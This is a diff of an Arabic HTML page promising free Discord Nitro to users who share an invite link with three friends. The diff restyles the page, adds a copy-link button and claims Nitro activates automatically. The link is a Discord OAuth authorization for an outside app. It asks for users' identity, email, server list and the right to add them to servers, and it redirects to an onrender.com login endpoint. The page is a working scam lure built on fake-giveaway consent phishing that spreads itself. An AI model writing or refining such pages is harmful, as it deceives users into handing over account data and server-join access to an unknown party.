@@ -2,48 +2,99 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title>أدخل صديقك</title>
+  <title>شارك رابطك</title>
   <style>
     body {
-      background-color: #23272a;
-      color: white;
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding-top: 100px;
-    }
-    h1 {
-      font-size: 38px;
-      margin-bottom: 20px;
-    }
-    h2 {
-      font-size: 26px;
-      margin-bottom: 40px;
-    }
-    .link-box {
       background-color: #2c2f33;
+      color: white;
+      font-family: 'Arial', sans-serif;
+      text-align: center;
+      padding-top: 80px;
+    }
+
+    h1 {
+      font-size: 40px;
+      margin-bottom: 15px;
+    }
+
+    h2 {
+      font-size: 24px;
+      margin-bottom: 40px;
+      color: #b9bbbe;
+    }
+
+    .link-box {
+      background-color: #23272a;
       border: 2px dashed #7289da;
       display: inline-block;
       padding: 20px;
       border-radius: 10px;
-      font-size: 18px;
+      font-size: 16px;
       direction: ltr;
       color: #ffffff;
       margin-bottom: 20px;
+      width: 80%;
+      max-width: 700px;
+      word-wrap: break-word;
     }
-    .copy-text {
+
+    button.copy-btn {
+      background-color: #43b581;
+      color: white;
+      padding: 12px 25px;
+      font-size: 18px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: 0.3s;
+      margin-top: 15px;
+    }
+
+    button.copy-btn:hover {
+      background-color: #3aa36e;
+    }
+
+    .message {
+      margin-top: 30px;
+      font-size: 22px;
+      color: #ffffff;
+    }
+
+    .copied {
+      margin-top: 15px;
       color: #43b581;
-      font-weight: bold;
+      font-size: 18px;
+      display: none;
     }
   </style>
 </head>
 <body>
-  <h1>انسخ الرابط و أضف 3 أصدقاء 🎉</h1>
-  <h2>بعدها تعال خذ نيترو مجاني 🔥</h2>
 
-  <div class="link-box">
+  <h1>🎉 انسخ رابط الدعوة وشاركه مع أصدقائك</h1>
+  <h2>بعد دعوة 3 أصدقاء، سيتم تفعيل نيترو مجاني تلقائيًا!</h2>
+
+  <div class="link-box" id="inviteLink">
     https://discord.com/oauth2/authorize?client_id=1383106052010147840&response_type=code&redirect_uri=https%3A%2F%2Farabbroad.onrender.com%2Flogin&scope=identify+email+guilds+guilds.join
   </div>
 
-  <p class="copy-text">📋 اضغط كلك يمين وانسخ الرابط</p>
+  <button class="copy-btn" onclick="copyLink()">انسخ الرابط 📋</button>
+
+  <div class="copied" id="copiedMsg">✅ تم نسخ الرابط!</div>
+
+  <div class="message">🧨 أرسل الرابط الآن لأصدقائك، وكل ما دعيت 3 بيتم تفعيل النيترو تلقائيًا!</div>
+
+  <script>
+    function copyLink() {
+      const linkText = document.getElementById("inviteLink").innerText;
+      navigator.clipboard.writeText(linkText).then(function() {
+        const msg = document.getElementById("copiedMsg");
+        msg.style.display = "block";
+        setTimeout(() => {
+          msg.style.display = "none";
+        }, 2000);
+      });
+    }
+  </script>
+
 </body>
 </html>
